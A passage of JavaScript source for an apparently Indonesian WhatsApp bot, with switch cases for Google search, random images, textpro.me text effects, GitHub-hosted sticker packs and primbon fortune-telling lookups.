*Mime* : ${baby1[0].mime}
*Link* : ${baby1[0].link}`
m.reply(`${result4}`)
liaacans.sendMessage(m.chat, { document : { url : baby1[0].link}, fileName : baby1[0].nama, mimetype: baby1[0].mime }, { quoted : m }).catch ((err) => m.reply(mess.error))
}
break
         case 'google': {
                if (!text) throw `Example : ${prefix + command} fatih arridho`

                let google = require('google-it')

                google({'query': text}).then(res => {

                let teks = `Google Search From : ${text}\n\n`

                for (let g of res) {

                teks += `⭔ *Title* : ${g.title}\n`

                teks += `⭔ *Description* : ${g.snippet}\n`

                teks += `⭔ *Link* : ${g.link}\n\n────────────────────────\n\n`

                } 

                m.reply(teks)

                })

                }

                break
 case 'coffe': case 'coffee': case 'kopi': {
     m.reply(mess.wait)
            let buttons = [
                    {buttonId: `coffe`, buttonText: {displayText: 'Next Image'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: 'https://coffee.alexflipnote.dev/random' },
                    fileLength: jumlah,
                    caption: `☕ Ngopi pagi-pagi emg asik :)`,
                    footer: creator,
                    buttons: buttons,
                    headerType: 4
                }
                liaacans.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
            case 'randomcolor': case 'color': case 'warnarandom': case 'warna': {
            	m.reply(mess.wait)
                let anu = await fetchJson(`https://api.popcat.xyz/randomcolor`)
                buffer = await getBuffer(anu.image)
                liaacans.sendMessage(m.chat, { image: buffer, caption: `*Nama Warna : ${anu.name}*\n*Code : ${anu.hex}*`, footer: creator}, { quoted: m })
            }
            break
 case 'linkpoi': {


            	if (!text) throw 'Masukkan Query Link!'

     m.reply(mess.wait)
                let poi = await fetchJson(`https://linkpoi.ga/api.php?url=${text}`)

                liaacans.sendMessage(m.chat, { text: poi.shorturl + `\nNih Bro`}, { quoted: fkontak })

            }

            break
 case 'carbon': {

            	if (!text) throw 'No Query Text'

               m.reply(mess.wait)

               liaacans.sendMessage(m.chat, { image: { url: `https://api-rull.herokuapp.com/api/cmd?code=${text}` }, caption: `Nih Bro` }, { quoted: m })

            	}

            break
            case 'candy': case 'christmas': case '3dchristmas': case 'sparklechristmas': case 'holographic':

case 'deepsea': case 'scifi': case 'rainbow': case 'waterpipe': case 'spooky': case 'karbon': case 'neonlight2': 
case 'pencil': case 'circuit': case 'discovery': case 'metalic': case 'fiction': case 'demon': case '3dbox': 

case 'transformer': case 'berry': case 'thunder': case 'magma': case '3dstone': case 'greenneon': 

case 'neonlight': case 'glitch': case 'harrypotter': case 'brokenglass': case 'papercut': case 'lion2': 

case 'watercolor': case 'multicolor': case 'neondevil': case 'underwater': case 'graffitibike': case '3davengers': 

 case 'snow': case 'cloud': case 'honey': case 'ice': case 'fruitjuice': case 'biscuit': case 'wood': case 'whitebear': 

case 'chocolate': case 'strawberry': case 'matrix': case 'blood': case 'dropwater': case 'toxic': 

case 'lava': case 'rock': case 'bloodglas': case 'hallowen': case 'darkgold': case 'joker': case 'wicker':

 case 'firework': case 'skeleton': case 'blackpink': case 'sand': case 'glue': case '1917': case 'leaves': {


			 if (!text) return m.reply(`Example : ${prefix + command} rahmxbot`) 

             m.reply(mess.wait)

             let link

             if (/candy/.test(command)) link = 'https://textpro.me/create-christmas-candy-cane-text-effect-1056.html'

			 if (/bluecircuit/.test(command)) link = 'https://textpro.me/create-blue-circuit-style-text-effect-online-1043.html'

             if (/neonlight2/.test(command)) link = 'https://textpro.me/neon-light-text-effect-with-galaxy-style-981.html'

             if (/christmas/.test(command)) link = 'https://textpro.me/christmas-tree-text-effect-online-free-1057.html'

             if (/3dchristmas/.test(command)) link = 'https://textpro.me/3d-christmas-text-effect-by-name-1055.html'

             if (/sparklechristmas/.test(command)) link = 'https://textpro.me/sparkles-merry-christmas-text-effect-1054.html'

             if (/deepsea/.test(command)) link = 'https://textpro.me/create-3d-deep-sea-metal-text-effect-online-1053.html'

             if (/scifi/.test(command)) link = 'https://textpro.me/create-3d-sci-fi-text-effect-online-1050.html'

             if (/whitebear/.test(command)) link = 'https://textpro.me/online-black-and-white-bear-mascot-logo-creation-1012.html'

             if (/holographic/.test(command)) link = 'https://textpro.me/holographic-3d-text-effect-975.html'

             if (/3davengers/.test(command)) link = 'https://textpro.me/create-3d-avengers-logo-online-974.html'

             if (/rainbow/.test(command)) link = 'https://textpro.me/3d-rainbow-color-calligraphy-text-effect-1049.html'

             if (/waterpipe/.test(command)) link = 'https://textpro.me/create-3d-water-pipe-text-effects-online-1048.html'

             if (/spooky/.test(command)) link = 'https://textpro.me/create-halloween-skeleton-text-effect-online-1047.html'

             if (/greenneon/.test(command)) link = 'https://textpro.me/green-neon-text-effect-874.html'

             if (/lion2/.test(command)) link = 'https://textpro.me/create-lion-logo-mascot-online-938.html'

             if (/3dbox/.test(command)) link = 'https://textpro.me/3d-box-text-effect-online-880.html'

             if (/pencil/.test(command)) link = 'https://textpro.me/create-a-sketch-text-effect-online-1044.html'

             if (/circuit/.test(command)) link = 'https://textpro.me/create-blue-circuit-style-text-effect-online-1043.html'

             if (/discovery/.test(command)) link = 'https://textpro.me/create-space-text-effects-online-free-1042.html'

             if (/metalic/.test(command)) link = 'https://textpro.me/creat-glossy-metalic-text-effect-free-online-1040.html'

             if (/fiction/.test(command)) link = 'https://textpro.me/create-science-fiction-text-effect-online-free-1038.html'

             if (/demon/.test(command)) link = 'https://textpro.me/create-green-horror-style-text-effect-online-1036.html'

             if (/transformer/.test(command)) link = 'https://textpro.me/create-a-transformer-text-effect-online-1035.html'

             if (/berry/.test(command)) link = 'https://textpro.me/create-berry-text-effect-online-free-1033.html'

             if (/thunder/.test(command)) link = 'https://textpro.me/online-thunder-text-effect-generator-1031.html'

             if (/magma/.test(command)) link = 'https://textpro.me/create-a-magma-hot-text-effect-online-1030.html'

             if (/3dstone/.test(command)) link = 'https://textpro.me/3d-stone-cracked-cool-text-effect-1029.html'

             if (/neonlight/.test(command)) link = 'https://textpro.me/create-3d-neon-light-text-effect-online-1028.html'

             if (/glitch/.test(command)) link = 'https://textpro.me/create-impressive-glitch-text-effects-online-1027.html'

             if (/harrypotter/.test(command)) link = 'https://textpro.me/create-harry-potter-text-effect-online-1025.html'

             if (/brokenglass/.test(command)) link = 'https://textpro.me/broken-glass-text-effect-free-online-1023.html'

             if (/papercut/.test(command)) link = 'https://textpro.me/create-art-paper-cut-text-effect-online-1022.html'

             if (/watercolor/.test(command)) link = 'https://textpro.me/create-a-free-online-watercolor-text-effect-1017.html'

             if (/multicolor/.test(command)) link = 'https://textpro.me/online-multicolor-3d-paper-cut-text-effect-1016.html'

             if (/neondevil/.test(command)) link = 'https://textpro.me/create-neon-devil-wings-text-effect-online-free-1014.html'

             if (/underwater/.test(command)) link = 'https://textpro.me/3d-underwater-text-effect-generator-online-1013.html'

             if (/graffitibike/.test(command)) link = 'https://textpro.me/create-wonderful-graffiti-art-text-effect-1011.html'

             if (/snow/.test(command)) link = 'https://textpro.me/create-snow-text-effects-for-winter-holidays-1005.html'

             if (/cloud/.test(command)) link = 'https://textpro.me/create-a-cloud-text-effect-on-the-sky-online-1004.html'

             if (/karbon/.test(command)) link = 'https://textpro.me/carbon-text-effect-833.html'

             if (/honey/.test(command)) link = 'https://textpro.me/honey-text-effect-868.html'

             if (/ice/.test(command)) link = 'https://textpro.me/ice-cold-text-effect-862.html'

             if (/fruitjuice/.test(command)) link = 'https://textpro.me/fruit-juice-text-effect-861.html'

             if (/biscuit/.test(command)) link = 'https://textpro.me/biscuit-text-effect-858.html'

             if (/wood/.test(command)) link = 'https://textpro.me/wood-text-effect-856.html'

             if (/chocolate/.test(command)) link = 'https://textpro.me/chocolate-cake-text-effect-890.html'

             if (/strawberry/.test(command)) link = 'https://textpro.me/strawberry-text-effect-online-889.html'

             if (/matrix/.test(command)) link = 'https://textpro.me/matrix-style-text-effect-online-884.html'

             if (/blood/.test(command)) link = 'https://textpro.me/horror-blood-text-effect-online-883.html'

             if (/dropwater/.test(command)) link = 'https://textpro.me/dropwater-text-effect-872.html'

             if (/toxic/.test(command)) link = 'https://textpro.me/toxic-text-effect-online-901.html'

             if (/lava/.test(command)) link = 'https://textpro.me/lava-text-effect-online-914.html'

             if (/rock/.test(command)) link = 'https://textpro.me/rock-text-effect-online-915.html'

             if (/bloodglas/.test(command)) link = 'https://textpro.me/blood-text-on-the-frosted-glass-941.html'

             if (/hallowen/.test(command)) link = 'https://textpro.me/halloween-fire-text-effect-940.html'

             if (/darkgold/.test(command)) link = 'https://textpro.me/metal-dark-gold-text-effect-online-939.html'

             if (/joker/.test(command)) link = 'https://textpro.me/create-logo-joker-online-934.html'

             if (/wicker/.test(command)) link = 'https://textpro.me/wicker-text-effect-online-932.html'

             if (/firework/.test(command)) link = 'https://textpro.me/firework-sparkle-text-effect-930.html'

             if (/skeleton/.test(command)) link = 'https://textpro.me/skeleton-text-effect-online-929.html'

             if (/blackpink/.test(command)) link = 'https://textpro.me/create-blackpink-logo-style-online-1001.html'

             if (/sand/.test(command)) link = 'https://textpro.me/write-in-sand-summer-beach-free-online-991.html'

             if (/glue/.test(command)) link = 'https://textpro.me/create-3d-glue-text-effect-with-realistic-style-986.html'

             if (/1917/.test(command)) link = 'https://textpro.me/1917-style-text-effect-online-980.html'

             if (/leaves/.test(command)) link = 'https://textpro.me/natural-leaves-text-effect-931.html'

             let anu = await maker.textpro(link, text)

             liaacans.sendMessage(m.chat, { image: { url: anu }, caption: `TextPro made By RahmXBot` }, { quoted: m })

             }

             break
case 'glitch2': case 'harrypot': case 'graffiti': case 'pornhub': case 'glitch3': case '3dspace': case 'lion': case 'wolf': case 'retro': case '8bit': {
             if(!text) return m.reply(`Use ${prefix + command} text1|text2`)
             m.reply(mess.wait)
             teks1 = q.split("|")[0]
             teks2 = q.split("|")[1]
             let link
             if (/glitch3/.test(command)) link = 'https://textpro.me/create-glitch-text-effect-style-tik-tok-983.html'
             if (/harrypot/.test(command)) link = 'https://textpro.me/create-harry-potter-text-effect-online-1025.html'
             if (/graffiti/.test(command)) link = 'https://textpro.me/create-a-cool-graffiti-text-on-the-wall-1010.html'
             if (/pornhub/.test(command)) link = 'https://textpro.me/pornhub-style-logo-online-generator-free-977.html'
             if (/glitch2/.test(command)) link = 'https://textpro.me/create-a-glitch-text-effect-online-free-1026.html'
             if (/3dspace/.test(command)) link = 'https://textpro.me/create-space-3d-text-effect-online-985.html'
             if (/lion/.test(command)) link = 'https://textpro.me/create-lion-logo-mascot-online-938.html'
             if (/wolf/.test(command)) link = 'https://textpro.me/create-wolf-logo-galaxy-online-936.html'
             if (/retro/.test(command)) link = 'https://textpro.me/create-3d-retro-text-effect-online-free-1065.html'
             if (/8bit/.test(command)) link = 'https://textpro.me/video-game-classic-8-bit-text-effect-1037.html'
             let anu = await maker.textpro(link, [`${teks1}`,`${teks2}`])
             liaacans.sendMessage(m.chat, { image: { url: anu }, caption: `Made by RahmXBot For my Darling ` }, { quoted: m })
             }
             break
//Pembatas Primbon========================================

case 'patrick': case 'patricksticker': case 'petrik': {
m.reply(mess.wait)
var ano = await fetchJson('https://raw.githubusercontent.com/rashidsiregar28/data/main/patrik')

var wifegerak = ano.split('\n')

var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]

encmedia = await liaacans.sendImageAsSticker(m.chat, wifegerakx, m, { packname: global.packname, author: global.author, })

await fs.unlinkSync(encmedia)

}

break

case 'dogesticker': case 'dogestick': case 'doge': case 'domge': {
m.reply(mess.wait)
var ano = await fetchJson('https://raw.githubusercontent.com/rashidsiregar28/data/main/anjing')

var wifegerak = ano.split('\n')

var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]

encmedia = await liaacans.sendImageAsSticker(m.chat, wifegerakx, m, { packname: global.packname, author: global.author, })

await fs.unlinkSync(encmedia)

}

break

case 'lovesticker': case 'lovestick' : case 'slove': {
m.reply(mess.wait)
var ano = await fetchJson('https://raw.githubusercontent.com/rashidsiregar28/data/main/bucin')

var wifegerak = ano.split('\n')

var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]

encmedia = await liaacans.sendImageAsSticker(m.chat, wifegerakx, m, { packname: global.packname, author: global.author, })

await fs.unlinkSync(encmedia)

}

break

case 'gura': case 'gurastick': {
m.reply(mess.wait)
var ano = await fetchJson('https://raw.githubusercontent.com/rashidsiregar28/data/main/gura')

var wifegerak = ano.split('\n')

var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]

encmedia = await liaacans.sendImageAsSticker(m.chat, wifegerakx, m, { packname: global.packname, author: global.author, })

await fs.unlinkSync(encmedia)

}

break

case 'paimon': {
m.reply(mess.wait)
var ano = await fetchJson('https://raw.githubusercontent.com/rashidsiregar28/data/main/Paimon')

var wifegerak = ano.split('\n')

var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]

encmedia = await liaacans.sendImageAsSticker(m.chat, wifegerakx, m, { packname: global.packname, author: global.author, })

await fs.unlinkSync(encmedia)

}

break

case 'sanime': case 'animestick': {
m.reply(mess.wait)
var ano = await fetchJson('https://raw.githubusercontent.com/rashidsiregar28/data/main/animestick')

var wifegerak = ano.split('\n')

var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]

encmedia = await liaacans.sendImageAsSticker(m.chat, wifegerakx, m, { packname: global.packname, author: global.author, })

await fs.unlinkSync(encmedia)

}

break

/*case 'mukelu': case 'lu': { // cari ae dulu website apikeynya yg ini udah not 404:v
m.reply(mess.wait)
var ano = await fetchJson('https://raw.githubusercontent.com/rashidsiregar28/data/main/mukelu')

var wifegerak = ano.split('\n')

var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]

encmedia = await liaacans.sendImageAsSticker(m.chat, wifegerakx, m, { packname: global.packname, author: global.author, })

await fs.unlinkSync(encmedia)

}

break*/
case 'motivasi': {
    m.reply(mess.wait)
                let anu = await fetchJson(`https://kocakz.herokuapp.com/api/random/text/quotes`)
                let buttons = [
                    {buttonId: `motivasi`, buttonText: {displayText: 'Next'}, type: 1}
                ]
                let buttonMessage = {
                    text: anu.result.quote,
                    footer: creator,
                    buttons: buttons,
                    headerType: 2
                }
                liaacans.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
	    case 'nomerhoki': case 'nomorhoki': {
                if (!Number(text)) throw `Example : ${prefix + command} 6285822347348`
                let anu = await primbon.nomer_hoki(Number(text))
                if (anu.status == false) return m.reply(anu.message)
                liaacans.sendText(m.chat, `⭔ *Nomor HP :* ${anu.message.nomer_hp}\n⭔ *Angka Shuzi :* ${anu.message.angka_shuzi}\n⭔ *Energi Positif :*\n- Kekayaan : ${anu.message.energi_positif.kekayaan}\n- Kesehatan : ${anu.message.energi_positif.kesehatan}\n- Cinta : ${anu.message.energi_positif.cinta}\n- Kestabilan : ${anu.message.energi_positif.kestabilan}\n- Persentase : ${anu.message.energi_positif.persentase}\n⭔ *Energi Negatif :*\n- Perselisihan : ${anu.message.energi_negatif.perselisihan}\n- Kehilangan : ${anu.message.energi_negatif.kehilangan}\n- Malapetaka : ${anu.message.energi_negatif.malapetaka}\n- Kehancuran : ${anu.message.energi_negatif.kehancuran}\n- Persentase : ${anu.message.energi_negatif.persentase}`, m)
            }
            break
            case 'artimimpi': case 'tafsirmimpi': {
                if (!text) throw `Example : ${prefix + command} belanja`
                let anu = await primbon.tafsir_mimpi(text)
                if (anu.status == false) return m.reply(anu.message)
                liaacans.sendText(m.chat, `⭔ *Mimpi :* ${anu.message.mimpi}\n⭔ *Arti :* ${anu.message.arti}\n⭔ *Solusi :* ${anu.message.solusi}`, m)
            }
            break
            case 'ramalanjodoh': case 'ramaljodoh': {
                if (!text) throw `Example : ${prefix + command} Dika, 7, 7, 2005, Novia, 16, 11, 2004`
                let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
                let anu = await primbon.ramalan_jodoh(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
                if (anu.status == false) return m.reply(anu.message)
                liaacans.sendText(m.chat, `⭔ *Nama Anda :* ${anu.message.nama_anda.nama}\n⭔ *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n⭔ *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n⭔ *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'ramalanjodohbali': case 'ramaljodohbali': {
                if (!text) throw `Example : ${prefix + command} Dika, 7, 7, 2005, Novia, 16, 11, 2004`
                let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
                let anu = await primbon.ramalan_jodoh_bali(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
                if (anu.status == false) return m.reply(anu.message)
               liaacans.sendText(m.chat, `⭔ *Nama Anda :* ${anu.message.nama_anda.nama}\n⭔ *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n⭔ *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n⭔ *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'suamiistri': {
                if (!text) throw `Example : ${prefix + command} Dika, 7, 7, 2005, Novia, 16, 11, 2004`
                let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
                let anu = await primbon.suami_istri(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
                if (anu.status == false) return m.reply(anu.message)
                liaacans.sendText(m.chat, `⭔ *Nama Suami :* ${anu.message.suami.nama}\n⭔ *Lahir Suami :* ${anu.message.suami.tgl_lahir}\n⭔ *Nama Istri :* ${anu.message.istri.nama}\n⭔ *Lahir Istri :* ${anu.message.istri.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'ramalancinta': case 'ramalcinta': {
                if (!text) throw `Example : ${prefix + command} Dika, 7, 7, 2005, Novia, 16, 11, 2004`
                let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
                let anu = await primbon.ramalan_cinta(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
                if (anu.status == false) return m.reply(anu.message)
                liaacans.sendText(m.chat, `⭔ *Nama Anda :* ${anu.message.nama_anda.nama}\n⭔ *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n⭔ *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n⭔ *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n⭔ *Sisi Positif :* ${anu.message.sisi_positif}\n⭔ *Sisi Negatif :* ${anu.message.sisi_negatif}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'artinama': {
                if (!text) throw `Example : ${prefix + command} Dika Ardianta`
                let anu = await primbon.arti_nama(text)
                if (anu.status == false) return m.reply(anu.message)
                liaacans.sendText(m.chat, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Arti :* ${anu.message.arti}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'kecocokannama': case 'cocoknama': {
                if (!text) throw `Example : ${prefix + command} Dika, 7, 7, 2005`
                let [nama, tgl, bln, thn] = text.split`,`
                let anu = await primbon.kecocokan_nama(nama, tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                liaacans.sendText(m.chat, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Life Path :* ${anu.message.life_path}\n⭔ *Destiny :* ${anu.message.destiny}\n⭔ *Destiny Desire :* ${anu.message.destiny_desire}\n⭔ *Personality :* ${anu.message.personality}\n⭔ *Persentase :* ${anu.message.persentase_kecocokan}`, m)
            }
            break
            case 'kecocokanpasangan': case 'cocokpasangan': case 'pasangan': {
                if (!text) throw `Example : ${prefix + command} Dika|Novia`
                let [nama1, nama2] = text.split`|`
                let anu = await primbon.kecocokan_nama_pasangan(nama1, nama2)
                if (anu.status == false) return m.reply(anu.message)
                liaacans.sendImage(m.chat,  anu.message.gambar, `⭔ *Nama Anda :* ${anu.message.nama_anda}\n⭔ *Nama Pasangan :* ${anu.message.nama_pasangan}\n⭔ *Sisi Positif :* ${anu.message.sisi_positif}\n⭔ *Sisi Negatif :* ${anu.message.sisi_negatif}`, m)
            }
            break
            case 'jadianpernikahan': case 'jadiannikah': {
                if (!text) throw `Example : ${prefix + command} 6, 12, 2020`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.tanggal_jadian_pernikahan(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                liaacans.sendText(m.chat, `⭔ *Tanggal Pernikahan :* ${anu.message.tanggal}\n⭔ *karakteristik :* ${anu.message.karakteristik}`, m)
            }
            break
            case 'sifatusaha': {
                if (!ext)throw `Example : ${prefix+ command} 28, 12, 2021`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.sifat_usaha_bisnis(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                liaacans.sendText(m.chat, `⭔ *Lahir :* ${anu.message.hari_lahir}\n⭔ *Usaha :* ${anu.message.usaha}`, m)
            }
            break
            case 'rejeki': case 'rezeki': {
                if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.rejeki_hoki_weton(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                liaacans.sendText(m.chat, `⭔ *Lahir :* ${anu.message.hari_lahir}\n⭔ *Rezeki :* ${anu.message.rejeki}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'pekerjaan': case 'kerja': {
                if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.pekerjaan_weton_lahir(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                liaacans.sendText(m.chat, `⭔ *Lahir :* ${anu.message.hari_lahir}\n⭔ *Pekerjaan :* ${anu.message.pekerjaan}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'ramalannasib': case 'ramalnasib': case 'nasib': {
                if (!text) throw `Example❗:\n${prefix + command} 7,7,2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.ramalan_nasib(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                liaacans.sendText(m.chat, `⭔ *Analisa :* ${anu.message.analisa}\n⭔ *Angka Akar :* ${anu.message.angka_akar}\n⭔ *Sifat :* ${anu.message.sifat}\n⭔ *Elemen :* ${anu.message.elemen}\n⭔ *Angka Keberuntungan :* ${anu.message.angka_keberuntungan}`, m)
            }
            break
            case 'potensipenyakit': case 'penyakit': {
                if (!text) throw `Example : ${prefix + command} 7,7,2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.cek_potensi_penyakit(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                liaacans.sendText(m.chat, `⭔ *Analisa :* ${anu.message.analisa}\n⭔ *Sektor :* ${anu.message.sektor}\n⭔ *Elemen :* ${anu.message.elemen}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'artitarot': case 'tarot': {
                if (!text) throw `Example : ${prefix + command} 7,7,2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.arti_kartu_tarot(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                liaacans.sendImage(m.chat, anu.message.image, `⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Simbol Tarot :* ${anu.message.simbol_tarot}\n⭔ *Arti :* ${anu.message.arti}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'fengshui': {
                if (!text) throw `Example : ${prefix + command} Dika,1,2005\n\nNote : ${prefix + command} Nama, gender, tahun lahir\nGender : 1 untuk laki-laki & 2 untuk perempuan`
                let [nama, gender, tahun] = text.split`,`
                let anu = await primbon.perhitungan_feng_shui(nama, gender, tahun)
                if (anu.status == false) return m.reply(anu.message)
                liaacans.sendText(m.chat, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tahun_lahir}\n⭔ *Gender :* ${anu.message.jenis_kelamin}\n⭔ *Angka Kua :* ${anu.message.angka_kua}\n⭔ *Kelompok :* ${anu.message.kelompok}\n⭔ *Karakter :* ${anu.message.karakter}\n⭔ *Sektor Baik :* ${anu.message.sektor_baik}\n⭔ *Sektor Buruk :* ${anu.message.sektor_buruk}`, m)
            }
            break
            case 'haribaik': {
                if (!text) throw `Example : ${prefix + command} 7,7,2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.petung_hari_baik(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                liaacans.sendText(m.chat, `⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Kala Tinantang :* ${anu.message.kala_tinantang}\n⭔ *Info :* ${anu.message.info}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'harisangar': case 'taliwangke': {
                if (!text) throw `Example : ${prefix + command} 7,7,2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.hari_sangar_taliwangke(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                liaacans.sendText(m.chat, `⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Info :* ${anu.message.info}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'harinaas': case 'harisial': {
                if (!text) throw `Example : ${prefix + command} 7,7,2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.primbon_hari_naas(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                liaacans.sendText(m.chat, `⭔ *Hari Lahir :* ${anu.message.hari_lahir}\n⭔ *Tanggal Lahir :* ${anu.message.tgl_lahir}\n⭔ *Hari Naas :* ${anu.message.hari_naas}\n⭔ *Info :* ${anu.message.catatan}\n⭔ *Catatan :* ${anu.message.info}`, m)
            }
            break
            case 'nagahari': case 'harinaga': {
                if (!text) throw `Example : ${prefix + command} 7,7,2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.rahasia_naga_hari(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                liaacans.sendText(m.chat, `⭔ *Hari Lahir :* ${anu.message.hari_lahir}\n⭔ *Tanggal Lahir :* ${anu.message.tgl_lahir}\n⭔ *Arah Naga Hari :* ${anu.message.arah_naga_hari}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'arahrejeki': case 'arahrezeki': {
                if (!text) throw `Example : ${prefix + command} 7,7,2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.primbon_arah_rejeki(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                liaacans.sendText(m.chat, `⭔ *Hari Lahir :* ${anu.message.hari_lahir}\n⭔ *tanggal Lahir :* ${anu.message.tgl_lahir}\n⭔ *Arah Rezeki :* ${anu.message.arah_rejeki}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'peruntungan': {
                if (!text) throw `Example : ${prefix + command} DIka,7,7,2005,2022\n\nNote : ${prefix + command} Nama, tanggal lahir, bulan lahir, tahun lahir, untuk tahun`
                let [nama, tgl, bln, thn, untuk] = text.split`,`
                let anu = await primbon.ramalan_peruntungan(nama, tgl, bln, thn, untuk)
                if (anu.status == false) return m.reply(anu.message)
                liaacans.sendText(m.chat, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Peruntungan Tahun :* ${anu.message.peruntungan_tahun}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'weton': case 'wetonjawa': {
                if (!text) throw `Example : ${prefix + command} 7,7,2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.weton_jawa(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                liaacans.sendText(m.chat, `⭔ *Tanggal :* ${anu.message.tanggal}\n⭔ *Jumlah Neptu :* ${anu.message.jumlah_neptu}\n⭔ *Watak Hari :* ${anu.message.watak_hari}\n⭔ *Naga Hari :* ${anu.message.naga_hari}\n⭔ *Jam Baik :* ${anu.message.jam_baik}\n⭔ *Watak Kelahiran :* ${anu.message.watak_kelahiran}`, m)
            }
            break
            case 'sifat': case 'karakter': {
                if (!text) throw `Example : ${prefix + command} Dika, 7,7,2005`
                let [nama, tgl, bln, thn] = text.split`,`
                let anu = await primbon.sifat_karakter_tanggal_lahir(nama, tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                liaacans.sendText(m.chat, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Garis Hidup :* ${anu.message.garis_hidup}`, m)
            }
            break
            case 'keberuntungan': {
                if (!text) throw `Example : ${prefix + command} Dika, 7,7,2005`
                let [nama, tgl, bln, thn] = text.split`,`
                let anu = await primbon.potensi_keberuntungan(nama, tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                liaacans.sendText(m.chat, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}`, m)
            }
            break
            case 'memancing': {
                if (!text) throw `Example : ${prefix + command} 12,1,2022`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.primbon_memancing_ikan(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
